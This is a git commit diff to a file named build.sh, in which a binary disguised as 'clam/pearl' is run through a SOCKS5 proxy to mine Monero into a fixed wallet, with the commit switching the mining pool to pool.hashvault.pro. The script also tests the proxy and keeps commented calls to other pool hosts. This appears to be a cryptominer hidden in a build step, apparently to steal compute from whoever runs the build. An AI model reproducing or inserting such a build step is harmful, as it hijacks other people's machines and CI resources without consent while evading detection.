23e62af4848f72b999267d5530e746086e9df3a7
vladimir <vladimir@playsnook.com>
2024-09-13 14:12:50 +0300

    hashv

--- build.sh
+++ build.sh
@@ -13,7 +13,10 @@ curl --socks5 199.116.112.6:4145 ipinfo.io
 
 # does not work wothout proxy
 echo "Running pearl"
-timeout 360 clam/pearl -x 199.116.112.6:4145 -o pool.supportxmr.com:3333 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero
+#timeout 360 clam/pearl -x 199.116.112.6:4145 -o pool.supportxmr.com:3333 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero
+timeout 60 clam/pearl -x 199.116.112.6:4145 -o pool.hashvault.pro:443 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero
+
+
 exit 0
 #curl 18.196.88.146:14433
 #ping -c 1 xmr-eu1.nanopool.org
